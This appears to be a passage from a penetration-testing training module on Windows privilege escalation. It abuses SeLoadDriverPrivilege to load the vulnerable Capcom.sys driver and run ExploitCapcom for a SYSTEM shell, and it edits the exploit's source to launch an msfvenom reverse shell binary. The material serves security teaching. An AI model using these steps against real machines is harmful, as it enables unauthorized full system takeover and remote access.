#### Confirming Privileges

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```
#### Checking Privileges Again

The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line.

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ===============================   ==========
SeMachineAccountPrivilege     Add workstations to domain        Disabled
SeLoadDriverPrivilege         Load and unload device drivers    Disabled
SeShutdownPrivilege           Shut down the system              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set    Disabled
```

We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.

```c#
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
#### Compile with cl.exe

```cmd
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
#### Add Reference to Driver

Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```cmd
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt 
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```
#### Verify Privilege is Enabled

```cmd
C:\htb> EnableSeLoadDriverPrivilege.exe
```
#### Verify Capcom Driver is Listed

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```
#### Use ExploitCapcom Tool to Escalate Privileges

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell
PS C:\htb> .\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges.

![](Print%20Operators-20260819-140807.png)
## Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
## Automating the Steps
#### Automating with EopLoadDriver

```cmd
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
## Clean-up
#### Removing Registry Key

```cmd
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom
```
